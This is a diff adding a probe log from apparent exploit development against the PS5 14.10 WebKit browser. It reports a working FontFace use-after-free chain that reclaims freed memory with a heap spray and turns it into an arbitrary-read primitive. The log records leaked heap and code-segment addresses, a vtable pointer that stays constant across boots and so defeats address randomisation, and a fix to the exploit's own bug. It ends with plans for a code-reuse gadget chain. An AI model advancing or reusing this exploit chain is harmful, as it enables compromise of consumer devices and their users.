@@ -1,0 +1,206 @@
+=== PROBE p691: walk-forge-fixed — PS5 14.10 WebKit ===
+Date: 2026-11-09 23:54 UTC-3
+Target: PS5 14.10 browser (WebKit 605.1.15 / Safari 17.0)
+Probe: p691-walk-forge-fixed.html via chiaki-ng remote play
+Server: serve.py on port 443 (HTTPS)
+
+== SUMMARY ==
+
+FULL SUCCESS: 4-step walk chain completed. CSSFontFaceSet vtable
+pointer (VP) and 9 vtable function pointers leaked from the WebProcess
+code segment. VP = WebProcess_base + constant_RVA. This is the
+WebProcess TEXT BASE LEAK — HARD BLOCKER #1 is solved.
+
+Run UHOGII (23:54:02):
+  - FontFace UAF trigger + spray reclaim: SUCCESS (1 buffer)
+  - L1 (hash table ptr) leak: SUCCESS — 0x10008a5ff0
+  - L2 (WeakPtrImpl*) leak: SUCCESS — 0x1000164140
+  - Self-discovery (spray buffer VA): SUCCESS — 0x1000384480
+  - VTAB (adjacent buffer): SUCCESS — 0x1000384100 (buffer j0)
+  - IHT (read 1: hash table): SUCCESS — 160 hex chars
+  - W2 (read 2: IM → FO): SUCCESS — FO = 0x1000160770
+  - W3 (read 3: FO → VP): SUCCESS — VP = 0x80f4b9b28
+  - W4 (read 4: VP → vtable): SUCCESS — 9 slots, 72 bytes
+  - WALK-ok: true
+
+== BUG FIX ==
+
+The VP validation threshold was `VP > 0x1000000000n` (68 GiB). VP is a
+CODE SEGMENT pointer at ~0x8xxxxxxxxx (~34 GiB), not a HEAP pointer at
+~0x10xxxxxxxxxx. The check always failed, so the W4 block never
+executed. h4/h5/VT were always empty strings — not because the CSS
+engine had a 3-read budget, but because the code that would have done
+the 4th read was inside an if-block that was never entered.
+
+Fix: changed threshold to `VP > 0x100000000n` (4 GiB).
+
+This one-line bug masked the working 4-read chain for multiple sessions.
+The "3-read limit" was a phantom.
+
+== WALK CHAIN ==
+
+The walk chain dereferences 4 pointers in sequence, each via
+forgeRead() + face.style (CSS property read from the reclaimed
+CSSFontFace buffer):
+
+  Step 1 (IHT): Read hash table at L1-0x10 (80 bytes)
+    → Parse metadata (dc, kc, mask, size) and scan 8 buckets
+    → Find client WeakPtrImpl address (IM)
+    Result: IM = 0x10009e0140
+
+  Step 2 (W2): Read IM+8 (16 bytes)
+    → Dereference WeakPtrImpl.m_ptr to find CSSFontFaceSet object (FO)
+    Result: FO = 0x1000160770
+
+  Step 3 (W3): Read FO (32 bytes)
+    → FO+0x00 = vtable pointer (VP) — CODE SEGMENT address
+    → FO+0x08 = IM (back-pointer, validates chain)
+    → FO+0x10 = spray buffer address (SELF!)
+    → FO+0x18 = another heap pointer
+    Result: VP = 0x80f4b9b28
+
+  Step 4 (W4): Read VP (72 bytes = 9 qwords)
+    → 9 vtable function pointers in the WebProcess code segment
+    Result: see VTABLE SLOTS below
+
+Between W3 and W4 there is a yield (restore safe state + sync XHR) as a
+safety measure. The yield is not required — the 4th read works with or
+without it.
+
+== VTABLE SLOTS (at VP) ==
+
+  Slot  Offset  Address         Notes
+  ----  ------  --------------  ---------------------------------
+  s0    +0x00   0x80dda8fb0     ~CSSFontFaceSet() destructor
+  s1    +0x08   0x80dda8fe0     deleting destructor (s0 + 0x30)
+  s2    +0x10   0x80c26d750     shared base impl (= s4, s5)
+  s3    +0x18   0x80dda96b0     unique (fontStateChanged?)
+  s4    +0x20   0x80c26d750     = s2
+  s5    +0x28   0x80c26d750     = s2
+  s6    +0x30   0x80d9ff400     unique
+  s7    +0x38   0x80dda9810     unique
+  s8    +0x40   0x000000000     NULL (vtable end marker)
+
+Pattern: s2 = s4 = s5 indicates three virtual methods sharing one base
+class implementation (likely CSSFontFace::Client pure virtuals that
+CSSFontFaceSet doesn't override, or a common no-op stub).
+
+Inter-slot deltas (from VP):
+  s0: VP - s0 = 0x170_0B78
+  s1: VP - s1 = 0x170_0B48  (s1 = s0 + 0x30)
+  s2: VP - s2 = 0x2CE_C3D8
+  s3: VP - s3 = 0x170_0478
+  s6: VP - s6 = 0x14B_A728
+  s7: VP - s7 = 0x170_0318
+
+== VP ACROSS 5 BOOTS ==
+
+All VP values end in 0xB28 (fixed page offset within the WebProcess
+binary), confirming the vtable is at a constant RVA:
+
+  Boot 1: 0x81780db28   (earlier session)
+  Boot 2: 0x82dbcdb28   (earlier session)
+  Boot 3: 0x809e21b28   (earlier session)
+  Boot 4: 0x805e09b28   (earlier session)
+  Boot 5: 0x80f4b9b28   (this run)
+
+  VP = WebProcess_base + CSSFontFaceSet_vtable_RVA
+
+  WebProcess_base = VP - RVA
+  (RVA to be determined from WebKit 605.1.15 source analysis)
+
+== ADDRESSES DISCOVERED (this run) ==
+
+  L1 (hash table)       = 0x10008a5ff0  (engine-written at CSSFontFace+0x58)
+  L2 (WeakPtrImpl*)     = 0x1000164140  (engine-written at CSSFontFace+0x68)
+  SELF (spray buffer)   = 0x1000384480  (found via +0x38 marker oracle)
+  VTAB (adjacent buf)   = 0x1000384100  (14 positions below SELF)
+  IM (client WeakPtr)   = 0x10009e0140  (from hash table bucket)
+  FO (CSSFontFaceSet)   = 0x1000160770  (from IM+8 dereference)
+  VP (vtable pointer)   = 0x80f4b9b28   (from FO+0x00, CODE SEGMENT)
+
+Address relationships:
+  SELF - VTAB  = 0x380 = 896 bytes = 14 × 64B spray positions
+  L1 - SELF    = ~5.3 MB (hash table region above spray)
+  FO + 0x10    = SELF (CSSFontFaceSet stores pointer to the reclaimed buffer)
+
+== HASH TABLE METADATA ==
+
+  hw0 = 02000000 01000000 07000000 08000000
+        dc=2     kc=1     mask=7   size=8
+
+  deletedCount=2, keyCount=1 (one active client), tableSizeMask=7,
+  tableSize=8 (8 buckets). One client = CSSFontFaceSet. Consistent
+  across all successful runs.
+
+== h3 DATA (CSSFontFaceSet at FO, 32 bytes) ==
+
+  FO+0x00: 0x80f4b9b28   VP (vtable pointer → code segment)
+  FO+0x08: 0x10009e0140  IM (back-pointer to WeakPtrImpl)
+  FO+0x10: 0x1000384480  SELF (spray buffer address!)
+  FO+0x18: 0x100087800e  another heap pointer (varies)
+
+== TIMELINE (run UHOGII) ==
+
+  23:54:02.394  BOOT-UHOGII,ctl=0
+  23:54:02.418  RES-n2 (2 faces resolved)
+  23:54:02.451  L1-0x10008a5ff0
+  23:54:02.463  L2-0x1000164140
+  23:54:02.470  FORGED-1 (1 spray buffer reclaimed)
+  23:54:02.491  FAMILY-OK (face renamed)
+  23:54:02.524  ADD-OK (face re-added to document.fonts)
+  23:54:02.716  DIAG-bufs=1,fam=zz0,zi=0
+  23:54:02.833  A-DEAD (boundary oracle dead)
+  23:54:02.937  PH2-SKIP-DEAD
+  23:54:03.001  PH3-START (self-scan begins)
+  23:54:25.559  SELF-0x1000384480 (spray buffer VA found!)
+  23:54:27.915  DEL-OK (step 7: delete face from set before walk)
+  23:54:28.974  IHT-ok-160 (read 1: hash table, 160 hex chars)
+  23:54:29.245  VTAB-0x1000384100-j0 (adjacent buffer found)
+  23:54:29.294  W3-MID (yield between W3 and W4)
+  23:54:29.478  WALK-hw0..hw3 (hash table metadata)
+  23:54:29.630  WALK-IM/FO/VP
+  23:54:29.671  WALK-h2 (FO data)
+  23:54:29.709  WALK-h3 (VP + back-pointers)
+  23:54:29.746  WALK-h4len=144,raw4len=175 (W4 SUCCEEDED!)
+  23:54:29.849  WALK-wt4=normal (face.weight also works)
+  23:54:29.889  WALK-h4 (decoded vtable, first 40 hex chars)
+  23:54:29.997  WALK-VT (full 144 hex chars, 9 qwords)
+  23:54:30.068  WALK-ok=true
+  23:54:30.109  VT-s0..s2
+  23:54:30.152  VT-s3..s5
+  23:54:30.188  VT-s6..s8
+
+== WHAT THIS MEANS ==
+
+1. The FontFace UAF walk chain is a WORKING arbitrary-read primitive.
+   Four sequential reads, each redirecting face.style to an attacker-
+   chosen address, successfully walk from the hash table through two
+   pointer dereferences to reach the WebProcess code segment.
+
+2. VP is a CODE SEGMENT pointer with a fixed low-order offset (0xB28)
+   across all observed boots. This is the CSSFontFaceSet vtable in
+   WebProcess .rodata. VP = WebProcess_base + RVA.
+
+3. The 9 vtable function pointers are also code-segment addresses.
+   Their inter-slot deltas are constant, providing redundant validation
+   of the leak.
+
+4. The read primitive can target any readable address in the WebProcess
+   address space. It is not limited to heap — the W4 read successfully
+   targeted code-segment .rodata at 0x8xxxxxxxxx.
+
+== REMAINING WORK ==
+
+1. Determine the static CSSFontFaceSet vtable RVA from WebKit 605.1.15
+   source or binary analysis. Then: WebProcess_base = VP - RVA.
+
+2. With WebProcess_base known, the code-reuse chain can target known
+   functions/gadgets at base + offset.
+
+3. The arbitrary-read primitive (forgeRead + face.style) can also be
+   used to scan WebProcess memory for additional structures.
+
+== BEACON LOG ==
+
+Full beacon log: p691_walk_forge_fixed_20261109_235425.log (947 lines)
